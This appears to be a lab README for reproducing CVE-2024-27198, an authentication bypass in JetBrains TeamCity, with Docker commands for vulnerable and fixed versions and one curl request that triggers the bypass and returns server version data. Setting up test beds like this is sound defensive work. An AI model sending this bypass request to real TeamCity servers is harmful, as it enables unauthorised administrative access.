# JetBrains TeamCity CVE-2024-27198

This directory contains the deployment config for JetBrains TeamCity instances vulnerable and fixed to CVE-2024-27198. In JetBrains TeamCity before 2023.11.4 authentication bypass allows users to perform administrative actions.

## How to Trigger the Vulnerability?

To trigger the vulnerability, you can use the following curl command. Since this vulnerability is an authentication bypass vulnerability, you should see the version info (like `version="2023.11.3 (build 147512)" versionMajor="2023" versionMinor="11"`) in the response for vulnerable instances.

Curl Request:

```sh
curl "http://localhost:8111/hax?jsp=/app/rest/server;.jsp"  -H "Accept: */*"
```
## Fixed version
```sh
docker run -it --rm --name teamcity-fixed -u root -p 8111:8111 jetbrains/teamcity-server:2023.11.4
```

The deployed service listens on `localhost:8111` after the docker completes its job. For the first time, you need to visit the `http://localhost:8111/` to setup and determine an admin account credential. Just proceeding with the default options is enough.

## Vulnerable version
```sh
docker run -it -d --name teamcity-vuln -u root -p 8111:8111 jetbrains/teamcity-server:2023.11.3
```

The deployed service listens on `localhost:8111` after the docker completes its job. For the first time, you need to visit the `http://localhost:8111/` to setup and determine an admin account credential. Just proceeding with the default options is enough.
